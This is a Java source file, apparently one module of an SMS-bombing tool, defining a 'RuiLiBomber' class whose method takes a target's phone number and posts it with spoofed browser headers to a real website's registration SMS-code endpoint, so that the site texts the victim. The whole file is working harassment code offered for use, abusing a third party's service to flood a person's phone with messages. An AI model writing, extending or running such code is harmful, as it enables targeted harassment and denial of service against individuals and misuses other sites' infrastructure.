package com.utils.attack;

import com.utils.HttpUtil;
import org.apache.http.impl.client.CloseableHttpClient;

import java.util.HashMap;
import java.util.Map;

/**
 * Created by fz on 2015/8/23.
 */
public class RuiLiBomber implements MessageBomber{

    public String name;

    public RuiLiBomber(String name){
        this.name = name;
    }

    @Override
    public String emissionMissile(CloseableHttpClient httpClient, String fuckNo) throws Exception {

        String url = "http://user.rayli.com.cn/forum.php?mod=ajax&infloat=register&handlekey=register&action=dsmscode&fbry=21658YemE7255Xjsy33652&ajaxmenu=1&stype=register&mobile="+fuckNo+"&inajax=1&ajaxtarget=smscode_tip";
        Map headers = new HashMap();
        headers.put("Accept", "*/*");
        headers.put("Accept-Encoding", "gzip, deflate, sdch");
        headers.put("Accept-Language", "zh-CN,zh;q=0.8,en;q=0.6,ja;q=0.4,zh-TW;q=0.2");
        headers.put("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
        headers.put("DNT", "1");
        headers.put("Host", "user.rayli.com.cn");
        headers.put("Referer", "http://user.rayli.com.cn/member-register.html");
        headers.put("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36");
        headers.put("X-Requested-With", "XMLHttpRequest");
        Map params = new HashMap();
        params.put("mod", "ajax");
        params.put("infloat", "register");
        params.put("handlekey", "register");
        params.put("action", "dsmscode");
        params.put("fbry", "21658YemE7255Xjsy33652");
        params.put("ajaxmenu", "1");
        params.put("stype", "register");
        params.put("mobile", fuckNo);
        params.put("inajax", "1");
        params.put("ajaxtarget", "smscode_tip");
        String result = HttpUtil.httpPost(url, headers, params);
        return result;
    }

    @Override
    public String getBomberName() {
        return this.name;
    }
}
